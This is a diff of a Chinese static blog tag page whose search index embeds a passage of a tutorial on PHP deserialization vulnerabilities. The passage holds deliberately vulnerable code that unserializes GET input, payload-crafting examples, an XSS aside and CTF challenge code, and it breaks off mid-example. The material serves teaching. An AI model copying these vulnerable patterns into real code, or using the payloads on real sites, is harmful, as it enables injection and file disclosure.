@@ -1,122 +1,1619 @@
+<!DOCTYPE html>
 <html>
-  <head>
-  <meta charset="utf-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>knowledge-web | outlaws&#39; blog</title>
-<link rel="shortcut icon" href="https://outlaws-bai.github.io/favicon.ico?v=1616047425282">
-<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
-<link rel="stylesheet" href="https://outlaws-bai.github.io/styles/main.css">
-<link rel="alternate" type="application/atom+xml" title="knowledge-web | outlaws&#39; blog - Atom Feed" href="https://outlaws-bai.github.io/atom.xml">
-<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+<head>
+  <meta charset="UTF-8" />
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<meta name="keywords" content="Gridea静态个人博客">
+<meta name="description" content="生如逆旅，一苇以航。">
+<meta name="theme-color" content="#000">
+<title>outlaws&#39; blog</title>
+<link rel="shortcut icon" href="/favicon.ico?v=1616049827674">
+<link rel="stylesheet" href="/media/css/mist.css">
+<link rel="stylesheet" href="/media/fonts/font-awesome.css">
+<link
+  href="//fonts.googleapis.com/css?family=Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Rosario:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext"
+  rel="stylesheet" type="text/css">
+
+<link href="/media/hljs/styles/default.css"
+  rel="stylesheet">
+
+<link rel="stylesheet" href="/styles/main.css">
+
+<script src="/media/hljs/highlight.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.0/velocity.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.0/velocity.ui.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.css"
+  integrity="sha384-zB1R0rpPzHqg7Kpt0Aljp8JPLqbXI3bhnPWROx27a9N0Ll6ZP/+DiW/UqRcLbRjq" crossorigin="anonymous">
+
+
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.js"
+  integrity="sha384-y23I5Q6l+B6vatafAwxRu/0oK/79VlbSz7Q9aiSZUvyWYIYsd+qj+o24G5ZU2zJz" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/contrib/auto-render.min.js"
+  integrity="sha384-kWPLUVMOks5AQFrykwIup5lo0m3iMkkHrD0uJ4H5cjeGihAutqP0yW0J6dpFiVkI" crossorigin="anonymous"
+  onload="renderMathInElement(document.body);"></script>
 
 
 
-  <meta name="description" content="生如逆旅，一苇以航。" />
-  </head>
-  <body>
-    <div class="main">
-      <div class="main-content">
-        <div class="site-header">
-  <a href="https://outlaws-bai.github.io">
-  <img class="avatar" src="https://outlaws-bai.github.io/images/avatar.png?v=1616047425282" alt="">
-  </a>
-  <h1 class="site-title">
-    outlaws&#39; blog
-  </h1>
-  <p class="site-description">
-    生如逆旅，一苇以航。
-  </p>
-  <div class="menu-container">
-    
-      
-        <a href="/" class="menu">
-          首页
-        </a>
-      
-    
-      
-        <a href="/archives" class="menu">
-          文章总览
-        </a>
-      
-    
-      
-        <a href="/tags" class="menu">
-          标签
-        </a>
-      
-    
-      
-        <a href="/post/about" class="menu">
-          关于
-        </a>
-      
-    
-  </div>
-  <div class="social-container">
-    
-      
-        <a href="https://github.com/outlaws-bai" target="_blank">
-          <i class="ri-github-line"></i>
-        </a>
-      
-    
-      
-    
-      
-    
-      
-    
-      
-    
-  </div>
-</div>
 
-        <div class="current-tag-container">
-            <h2 class="title">
-                标签：# knowledge-web
-            </h2> 
+
+</head>
+
+<body>
+  <div class="head-top-line"></div>
+  <div class="header-box">
+    
+<div class="mist">
+  <header class="header bg-color ">
+    <div class="blog-header box-shadow-wrapper  " id="header">
+      <div class="nav-toggle" id="nav_toggle">
+        <div class="toggle-box">
+          <div class="line line-top"></div>
+          <div class="line line-center"></div>
+          <div class="line line-bottom"></div>
         </div>
-        <div class="post-container">
+      </div>
+      <div class="site-meta">       
+        <div class="site-title">
+          
+            <a href="/" class="">
+              <span class="logo-line-before">
+                <i class=""></i>
+              </span>
+              <span class="main-title">outlaws&#39; blog</span>
+              <span class="logo-line-after">
+                <i class=""></i>
+              </span>
+            </a>  
+          
+        </div>
+        
+      </div>
+      <nav class="site-nav" id="site_nav">
+        <ul id="nav_ul">
+          
+            
+            
+              
+            
+            <li class="nav-item ">
+              
+              
+                
+                  <a href="/" target="_self">
+                    <i class="fa fa-home"></i> 首页
+                  </a>
+                
+              
+            </li>
+          
+            
+            
+              
+            
+            <li class="nav-item ">
+              
+              
+                
+                  <a href="/archives/" target="_self">
+                    <i class="fa fa-archive"></i> 文章总览
+                  </a>
+                
+              
+            </li>
+          
+            
+            
+              
+            
+            <li class="nav-item ">
+              
+              
+                
+                  <a href="/tags/" target="_self">
+                    <i class="fa fa-tags"></i> 标签
+                  </a>
+                
+              
+            </li>
+          
+            
+            
+              
+            
+            <li class="nav-item ">
+              
+              
+                
+                  <a href="/post/about/" target="_self">
+                    <i class="fa fa-user"></i> 关于
+                  </a>
+                
+              
+            </li>
+          
+          
+            
+              <li class="nav-item ">
+                <a href="/friends/" target="_self">
+                  
+                    <i class="fa fa-address-book"></i> 友情链接
+                  
+                </a>
+              </li>
+            
+          
+          
+            <li id="fa_search" class="nav-item">
+              <a href="javascript:void(0);">
+                <i class="fa fa-search"></i> <span class="language" data-lan="search">搜索</span>
+              </a>
+            </li>
+          
+        </ul>
+      </nav>
+    </div>
+  </header>
+</div>
+
+<script type="text/javascript"> 
+ 
+  let showNav = true;
+
+  let navToggle = document.querySelector('#nav_toggle'),
+  siteNav = document.querySelector('#site_nav');
   
-    <article class="post">
-      <a href="https://outlaws-bai.github.io/post/php-serialize&amp;unserialize/">
-        <h2 class="post-title">php序列化与反序列化</h2>
+  function navClick() {
+    let sideBar = document.querySelector('.sidebar');
+    let navUl = document.querySelector('#nav_ul');
+    navToggle.classList.toggle('nav-toggle-active');
+    siteNav.classList.toggle('nav-menu-active');
+    if (siteNav.classList.contains('nav-menu-active')) {
+      siteNav.style = "height: " + (navUl.children.length * 42) +"px !important";
+    } else {
+      siteNav.style = "";
+    }
+  }
+
+  navToggle.addEventListener('click',navClick);  
+</script>
+  </div>
+  <div class="main-continer">
+    
+    <div
+      class="section-layout bg-color mist">
+      <div class="section-layout-wrapper">
+        <div id="sidebarMeta" class="sidebar">
+    
+<div class="sidebar-wrapper box-shadow-wrapper ">
+  <div class="sidebar-item">
+    <img class="site-author-image right-motion" src="/images/avatar.png"/>
+    <p class="site-author-name">outlaws&#39;s blog</p>
+    
+  </div>
+  <div class="sidebar-item side-item-stat right-motion">
+    <div class="sidebar-item-box">
+      <a href="/archives/">
+        
+        <span class="site-item-stat-count">2</span>
+        <span class="site-item-stat-name language" data-lan="article">文章</span>
       </a>
-      <div class="post-info">
-        <span>
-          2021-03-18
-        </span>
-        <span>
-          26 min read
-        </span>
-        
-          <a href="https://outlaws-bai.github.io/tag/g6GKCnb6O/" class="post-tag">
-            # knowledge-web
-          </a>
-        
+    </div>
+    <div class="sidebar-item-box">
+      <a href="">
+        <span class="site-item-stat-count">2</span>
+        <span class="site-item-stat-name language" data-lan="category">分类</span>
+      </a>
+    </div>
+    <div class="sidebar-item-box">
+      <a href="/tags/">
+        <span class="site-item-stat-count">2</span>
+        <span class="site-item-stat-name language" data-lan="tag">标签</span>
+      </a>
+    </div>
+  </div>
+  
+  
+
+
+
+</div>
+</div>
+<script>
+  let sidebarMeta = document.querySelector('#sidebarMeta');
+  let scheme = 'mist';
+  let sidebarWrapper = document.querySelector('.sidebar-wrapper');
+  if (sidebarMeta && (scheme === 'pisces' || scheme === 'gemini')) {
+    document.addEventListener('scroll', function(e) {
+      if (document.scrollingElement.scrollTop > parseInt(sidebarMeta.style.marginTop) + 10) {
+        sidebarWrapper.classList.add('home-sidebar-fixed')
+      } else {
+        sidebarWrapper.classList.remove('home-sidebar-fixed')
+      }
+    });
+  }
+  </script>
+        <div class="section-box tag-line box-shadow-wrapper">
+          <section class="section tags-section posts-expand bg-color">
+            <div class="padding-wrapper">
+  <div class="tag-timeline-box">
+    <div class="tag-timeline-wrapper">
+      <div class="tag-timeline-title">
+        <h2>
+          knowledge-web
+          <small class="language" data-lan="tag">标签</small>
+        </h2>
       </div>
       
-      <div class="post-abstract">
-        
-      </div>
-    </article>
-  
+      
+      
+      <a href="https://outlaws-bai.github.io/post/php-serialize&amp;unserialize/">
+        <div class="motion-warpper">
+          <div class="tag-post-node">
+            <h1>
+              03-18
+              <small>php序列化与反序列化</small>
+            </h1>
+          </div>
+        </div>
+      </a>
+      
+      
+      
+      
+      
+      
+      
+      
+      
+    </div>
+  </div>
 </div>
-
-        <div class="pagination-container">
-  
-  
-</div>
-
-        <div class="site-footer">
-  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
-  <a class="rss" href="https://outlaws-bai.github.io/atom.xml" target="_blank">
-    <i class="ri-rss-line"></i> RSS
-  </a>
-</div>
-
+          </section>
+        </div>
       </div>
     </div>
-  </body>
+    <div class="footer-box">
+  <footer class="footer">
+    <div class="copyright">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | © 2019-2020 Theme By <a
+        href="https://github.com/hsxyhao/gridea-theme-next" target="_blank">HsxyHao</a>
+    </div>
+    <div class="poweredby">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+    </div>
+  </footer>
+  
+  
+  <div class="drawer-box left" id="drawer_box">
+    <span class="muse-line muse-line-first"></span>
+    <span class="muse-line muse-line-middle"></span>
+    <span class="muse-line muse-line-last"></span>
+  </div>
+  
+  <div class="mist back-to-top" id="back_to_top">
+    <i class="fa fa-arrow-up"></i>
+    
+  </div>
+  
+  
+  
+</div>
+<script>
+
+  let sideBarOpen = 'sidebar-open';
+  let body = document.body;
+  let back2Top = document.querySelector('#back_to_top'),
+    back2TopText = document.querySelector('#back_to_top_text'),
+    drawerBox = document.querySelector('#drawer_box'),
+    rightSideBar = document.querySelector('.sidebar'),
+    viewport = document.querySelector('body');
+
+  function scrollAnimation(currentY, targetY) {
+
+    let needScrollTop = targetY - currentY
+    let _currentY = currentY
+    setTimeout(() => {
+      const dist = Math.ceil(needScrollTop / 10)
+      _currentY += dist
+      window.scrollTo(_currentY, currentY)
+      if (needScrollTop > 10 || needScrollTop < -10) {
+        scrollAnimation(_currentY, targetY)
+      } else {
+        window.scrollTo(_currentY, targetY)
+      }
+    }, 1)
+  }
+
+  back2Top.addEventListener("click", function (e) {
+    scrollAnimation(document.scrollingElement.scrollTop, 0);
+    e.stopPropagation();
+    return false;
+  });
+
+  window.addEventListener('scroll', function (e) {
+    let percent = document.scrollingElement.scrollTop / (document.scrollingElement.scrollHeight - document.scrollingElement.clientHeight) * 100;
+    if (percent > 1 && !back2Top.classList.contains('back-top-active')) {
+      back2Top.classList.add('back-top-active');
+    }
+    if (percent == 0) {
+      back2Top.classList.remove('back-top-active');
+    }
+    if (back2TopText) {
+      back2TopText.textContent = Math.floor(percent);
+    }
+  });
+
+
+  let hasCacu = false;
+  window.onresize = function () {
+    calcuHeight();
+  }
+
+  function calcuHeight() {
+    // 动态调整站点概览高度
+    if (!hasCacu && back2Top.classList.contains('pisces') || back2Top.classList.contains('gemini')) {
+      let sideBar = document.querySelector('.sidebar');
+      let navUl = document.querySelector('#site_nav');
+      sideBar.style = 'margin-top:' + (navUl.offsetHeight + navUl.offsetTop + 15) + 'px;';
+      hasCacu = true;
+    }
+  }
+  calcuHeight();
+
+  let open = false, MOTION_TIME = 300, RIGHT_MOVE_DIS = '320px';
+
+  if (drawerBox) {
+    let rightMotions = document.querySelectorAll('.right-motion');
+    let right = drawerBox.classList.contains('right');
+
+    let transitionDir = right ? "transition.slideRightIn" : "transition.slideLeftIn";
+
+    let openProp, closeProp;
+    if (right) {
+      openProp = {
+        paddingRight: RIGHT_MOVE_DIS
+      };
+      closeProp = {
+        paddingRight: '0px'
+      };
+    } else {
+      openProp = {
+        paddingLeft: RIGHT_MOVE_DIS
+      };
+      closeProp = {
+        paddingLeft: '0px'
+      };
+    }
+
+    drawerBox.onclick = function () {
+      open = !open;
+      window.Velocity(rightSideBar, 'stop');
+      window.Velocity(viewport, 'stop');
+      window.Velocity(rightMotions, 'stop');
+      if (open) {
+        window.Velocity(rightSideBar, {
+          width: RIGHT_MOVE_DIS
+        }, {
+          duration: MOTION_TIME,
+          begin: function () {
+            window.Velocity(rightMotions, transitionDir, {});
+          }
+        })
+        window.Velocity(viewport, openProp, {
+          duration: MOTION_TIME
+        });
+      } else {
+        window.Velocity(rightSideBar, {
+          width: '0px'
+        }, {
+          duration: MOTION_TIME,
+          begin: function () {
+            window.Velocity(rightMotions, {
+              opacity: 0
+            });
+          }
+        })
+        window.Velocity(viewport, closeProp, {
+          duration: MOTION_TIME
+        });
+      }
+      for (let i = 0; i < drawerBox.children.length; i++) {
+        drawerBox.children[i].classList.toggle('muse-line');
+      }
+      drawerBox.classList.toggle(sideBarOpen);
+    }
+  }
+
+  // 链接跳转
+  let newWindow = 'false'
+  if (newWindow === 'true') {
+    let links = document.querySelectorAll('.post-body a')
+    links.forEach(item => {
+      if (!item.classList.contains('btn')) {
+        item.setAttribute("target", "_blank");
+      }
+    })
+  }
+
+  let faSearch = document.querySelector('#fa_search');
+  faSearch.addEventListener('click', function () {
+    document.querySelector('#search_mask').style = ''
+  })
+
+  // 代码高亮
+  hljs.initHighlightingOnLoad();
+  
+  // 离开当前页title变化
+  var leaveTitle = "";
+  if (leaveTitle) {
+    document.addEventListener('visibilitychange', function () {
+      if (document.visibilityState == 'hidden') {
+        normal_title = document.title;
+        document.title = leaveTitle;
+      } else {
+        document.title = normal_title;
+      }
+    });
+  }
+
+</script>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+<script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+<script>
+  let images = document.querySelectorAll('.section img');
+  console.log(images);
+  images.forEach(image => {
+    var parent = image.parentElement;
+    var next = image.nextElementSibling;
+    parent.removeChild(image);
+    var aelem = document.createElement('a');
+    aelem.href = image.src;
+    aelem.dataset['fancybox'] = 'images';
+    aelem.dataset['rel'] = 'fancybox-button';
+    aelem.classList.add('fancybox');
+    aelem.appendChild(image);
+    parent.insertBefore(aelem, next);
+  })
+</script>
+  </div>
+</body>
+
+<div class="search-mask" id="search_mask" style="display: none;">
+  <div class="search-box">
+    <div class="search-title">
+      <i class="fa fa-search"></i>
+      <div class="input-box">
+        <input id="search" type="text" class="language" data-lan="search" placeholder="搜索">
+      </div>
+      <i id="close" class="fa fa-times-circle"></i>
+    </div>
+    <div class="stat-box">
+      <span id="stat_count">0</span><span class="language" data-lan="stat">条相关条目，使用了</span><span id="stat_times">0</span><span class="language" data-lan="stat-time">毫秒</span>
+      <hr>
+    </div>
+    <div class="result" id="result">
+      
+      <div class="item">
+        <a class="result-title" style="opacity: 0;" href="https://outlaws-bai.github.io/post/php-serialize&amp;unserialize/"" data-c="
+          &lt;h1 id=&#34;序列化与反序列化&#34;&gt;序列化与反序列化&lt;/h1&gt;
+&lt;h2 id=&#34;序列化&#34;&gt;序列化&lt;/h2&gt;
+&lt;p&gt;定义：利用&lt;code&gt;serialize()&lt;/code&gt;函数将一个对象转换为字符串形式&lt;br&gt;
+我们先看一下直接输出对象是什么效果，代码如下&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+    class test{
+        public $name=&amp;quot;ghtwf01&amp;quot;;
+        public $age=&amp;quot;18&amp;quot;;
+    }
+    $a=new test();
+    print_r($a);
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;效果如下&lt;br&gt;
+&lt;a href=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112144212-8e85e4f4-0517-1.png&#34;&gt;&lt;img src=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112144212-8e85e4f4-0517-1.png&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/a&gt;&lt;br&gt;
+这个时候我们利用&lt;code&gt;serialize()&lt;/code&gt;函数将这个对象进行序列化成字符串然后输出，代码如下&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+    class test{
+        public $name=&amp;quot;ghtwf01&amp;quot;;
+        public $age=&amp;quot;18&amp;quot;;
+    }
+    $a=new test();
+    $a=serialize($a);
+    print_r($a);
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;效果如下&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;a href=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112144234-9c15d5ca-0517-1.png&#34;&gt;&lt;img src=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112144234-9c15d5ca-0517-1.png&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/a&gt;&lt;/figure&gt;
+&lt;p&gt;如果不是&lt;code&gt;public&lt;/code&gt;方法那么后面的读取方法就有点不一样，例如代码如下&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+    class test{
+        public $name=&amp;quot;ghtwf01&amp;quot;;
+        private $age=&amp;quot;18&amp;quot;;
+        protected $sex=&amp;quot;man&amp;quot;;
+    }
+    $a=new test();
+    $a=serialize($a);
+    print_r($a);
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;效果如下&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;a href=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112144245-a2973722-0517-1.png&#34;&gt;&lt;img src=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112144245-a2973722-0517-1.png&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/a&gt;&lt;/figure&gt;
+&lt;p&gt;private分析：&lt;br&gt;
+这样就发现本来是&lt;code&gt;age&lt;/code&gt;结果上面出现的是&lt;code&gt;testage&lt;/code&gt;，而且&lt;code&gt;testage&lt;/code&gt;长度为&lt;code&gt;7&lt;/code&gt;，但是上面显示的是&lt;code&gt;9&lt;/code&gt;&lt;br&gt;
+查找资料后发现&lt;strong&gt;private属性序列化的时候格式是%00类名%00成员名&lt;/strong&gt;，&lt;code&gt;%00&lt;/code&gt;占一个字节长度，所以&lt;code&gt;age&lt;/code&gt;加了类名后变成了&lt;code&gt;testage&lt;/code&gt;长度为&lt;code&gt;9&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;protect分析：&lt;br&gt;
+本来是&lt;code&gt;sex&lt;/code&gt;结果上面出现的是&lt;code&gt;*sex&lt;/code&gt;，而且&lt;code&gt;*sex&lt;/code&gt;的长度是&lt;code&gt;4&lt;/code&gt;，但是上面显示的是&lt;code&gt;6&lt;/code&gt;，同样查找资料后发现&lt;strong&gt;protect属性序列化的时候格式是%00*%00成员名&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;这里介绍一下public、private、protected的区别&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;public(公共的):在本类内部、外部类、子类都可以访问
+
+protect(受保护的):只有本类或子类或父类中可以访问
+
+private(私人的):只有本类内部可以使用
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;反序列化&#34;&gt;反序列化&lt;/h2&gt;
+&lt;p&gt;定义：反序列化就是利用&lt;code&gt;unserailize()&lt;/code&gt;函数将一个经过序列化的字符串还原成php代码形式，代码如下&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+    $b=&#39;序列化字符串&#39;;
+    $b=unserialize($b);
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h1 id=&#34;反序列化漏洞原理&#34;&gt;反序列化漏洞原理&lt;/h1&gt;
+&lt;p&gt;到这儿也许大家会想着序列化过去再反序列化回来，不就是形式之间的转换吗，和漏洞有什么关系&lt;br&gt;
+这里先掌握php常见的魔术方法，先列出几个最常见的魔术方法，当遇到这些的时候就需要注意了&lt;br&gt;
+附上讲解魔术方法的链接：https://segmentfault.com/a/1190000007250604&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;__construct()当一个对象创建时被调用
+
+__destruct()当一个对象销毁时被调用
+
+__toString()类被当做字符串使用时的回应方法
+
+__sleep() 在对象在被序列化之前运行
+
+__wakeup将在序列化之后立即被调用
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;我们用代码演示一下这些魔术方法的使用效果&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+    class test{
+        public $a=&#39;hacked by ghtwf01&#39;;
+        public $b=&#39;hacked by blckder02&#39;;
+        public function pt(){
+            echo $this-&amp;gt;a.&#39;&amp;lt;br /&amp;gt;&#39;;
+        }
+        public function __construct(){
+            echo &#39;__construct&amp;lt;br /&amp;gt;&#39;;
+        }
+        public function __destruct(){
+            echo &#39;__construct&amp;lt;br /&amp;gt;&#39;;
+        }
+        public function __sleep(){
+            echo &#39;__sleep&amp;lt;br /&amp;gt;&#39;;
+            return array(&#39;a&#39;,&#39;b&#39;);
+        }
+        public function __wakeup(){
+            echo &#39;__wakeup&amp;lt;br /&amp;gt;&#39;;
+        }
+    }
+    //创建对象调用__construct
+    $object = new test();
+    //序列化对象调用__sleep
+    $serialize = serialize($object);
+    //输出序列化后的字符串
+    echo &#39;serialize: &#39;.$serialize.&#39;&amp;lt;br /&amp;gt;&#39;;
+    //反序列化对象调用__wakeup
+    $unserialize=unserialize($serialize);
+    //调用pt输出数据
+    $unserialize-&amp;gt;pt();
+    //脚本结束调用__destruct
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;运行效果如下：&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;a href=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112144317-b5673690-0517-1.png&#34;&gt;&lt;img src=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112144317-b5673690-0517-1.png&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/a&gt;&lt;/figure&gt;
+&lt;p&gt;原来有一个实例化出的对象，然后又反序列化出了一个对象，就存在两个对象，所以最后销毁了两个对象也就出现了执行了两次&lt;code&gt;__destruct&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;这里我们看一个存在反序列化漏洞的代码&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+class A{
+    public $test = &amp;quot;demo&amp;quot;;
+    function __destruct(){
+            echo $this-&amp;gt;test;
+    }
+}
+$a = $_GET[&#39;value&#39;];
+$a_unser = unserialize($a);
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这样我们就可以利用这个反序列化代码，利用方法是将需要使用的代码序列化后传入，看到这段代码上面有&lt;code&gt;echo&lt;/code&gt;，我们尝试一下在这个页面显示&lt;code&gt;hacked by ghtwf01&lt;/code&gt;的字符，现在一边将这段字符串进行序列化，代码如下(这里的类名和对象名要和存在漏洞的代码一致，类名为&lt;code&gt;A&lt;/code&gt;,对象名为&lt;code&gt;test&lt;/code&gt;)&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+    class A{
+        public $test=&amp;quot;hacked by ghtwf01&amp;quot;;
+    }
+    $b= new A();
+    $result=serialize($b);
+    print_r($result);
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这样就得到这段字符序列化后的内容&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;a href=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112144328-bc4e7b80-0517-1.png&#34;&gt;&lt;img src=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112144328-bc4e7b80-0517-1.png&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/a&gt;&lt;/figure&gt;
+&lt;p&gt;将它传入目标网页，返回结果如下&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;5&#34;&gt;&lt;a href=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112144337-c162628a-0517-1.png&#34;&gt;&lt;img src=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112144337-c162628a-0517-1.png&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/a&gt;&lt;/figure&gt;
+&lt;p&gt;既然网页上能输出，那说明也可以进行XSS攻击，尝试一下，虽然有点鸡肋2333，到这里应该懂得点什么叫反序列化漏洞了&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;6&#34;&gt;&lt;a href=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112144342-c4a63282-0517-1.png&#34;&gt;&lt;img src=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112144342-c4a63282-0517-1.png&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/a&gt;&lt;/figure&gt;
+&lt;p&gt;一道简单的反序列化考点题&lt;br&gt;
+http://120.79.33.253:9001/&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+error_reporting(0);
+include &amp;quot;flag.php&amp;quot;;
+$KEY = &amp;quot;D0g3!!!&amp;quot;;
+$str = $_GET[&#39;str&#39;];
+if (unserialize($str) === &amp;quot;$KEY&amp;quot;)
+{
+    echo &amp;quot;$flag&amp;quot;;
+}
+show_source(__FILE__);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;题目的大意就是反序列化一个变量后的值等于&lt;code&gt;D0g3!!!&lt;/code&gt;，这个变量是用户输入的，于是我们写代码将&lt;code&gt;D0g3!!!&lt;/code&gt;序列化&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+    $a=&amp;quot;D0g3!!!&amp;quot;;
+    $b=serialize($a);
+    echo $b;
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;得到序列化后的内容是&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;7&#34;&gt;&lt;a href=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112144356-ccd49fe8-0517-1.png&#34;&gt;&lt;img src=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112144356-ccd49fe8-0517-1.png&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/a&gt;&lt;/figure&gt;
+&lt;p&gt;将序列化后的内容传入得到flag&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;8&#34;&gt;&lt;a href=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112144404-d13ff460-0517-1.png&#34;&gt;&lt;img src=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112144404-d13ff460-0517-1.png&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/a&gt;&lt;/figure&gt;
+&lt;p&gt;现在再来一道bugku的反序列化题&lt;br&gt;
+welcome to bugctf(这道题被恶搞的删了qwq，只好看看网上贴出的代码分析一下)&lt;/p&gt;
+&lt;p&gt;index.php&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php  
+
+$txt = $_GET[&amp;quot;txt&amp;quot;];  
+
+$file = $_GET[&amp;quot;file&amp;quot;];  
+
+$password = $_GET[&amp;quot;password&amp;quot;];  
+
+if(isset($txt)&amp;amp;&amp;amp;(file_get_contents($txt,&#39;r&#39;)===&amp;quot;welcome to the bugkuctf&amp;quot;)){  
+
+    echo &amp;quot;hello friend!&amp;lt;br&amp;gt;&amp;quot;;  
+
+    if(preg_match(&amp;quot;/flag/&amp;quot;,$file)){ 
+
+        echo &amp;quot;不能现在就给你flag哦&amp;quot;;
+
+        exit();  
+
+    }else{  
+
+        include($file);   
+
+        $password = unserialize($password);  
+
+        echo $password;  
+
+    }  
+
+}else{  
+
+    echo &amp;quot;you are not the number of bugku ! &amp;quot;;  
+
+}  
+
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;代码有点长我们先来分析一下这串代码想表达什么&lt;br&gt;
+1.先&lt;code&gt;GET&lt;/code&gt;传入参数&lt;code&gt;$txt&lt;/code&gt;、&lt;code&gt;$file&lt;/code&gt;、&lt;code&gt;$password&lt;/code&gt;&lt;br&gt;
+2.判断&lt;code&gt;$txt&lt;/code&gt;是否存在，如果存在并且值为&lt;code&gt;welcome to the bugkuctf&lt;/code&gt;就进一步操作，&lt;code&gt;$file&lt;/code&gt;参数里面不能包含&lt;code&gt;flag&lt;/code&gt;字段&lt;br&gt;
+3.通过以上判断就&lt;code&gt;include($file)&lt;/code&gt;，再将&lt;code&gt;$password&lt;/code&gt;反序列化并输出&lt;/p&gt;
+&lt;p&gt;hint.php&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php   
+
+class Flag{//flag.php  
+
+    public $file;  
+
+    public function __tostring(){  
+
+        if(isset($this-&amp;gt;file)){  
+
+            echo file_get_contents($this-&amp;gt;file); 
+
+            echo &amp;quot;&amp;lt;br&amp;gt;&amp;quot;;
+
+        return (&amp;quot;good&amp;quot;);
+
+        }  
+
+    }  
+
+}  
+
+?&amp;gt;
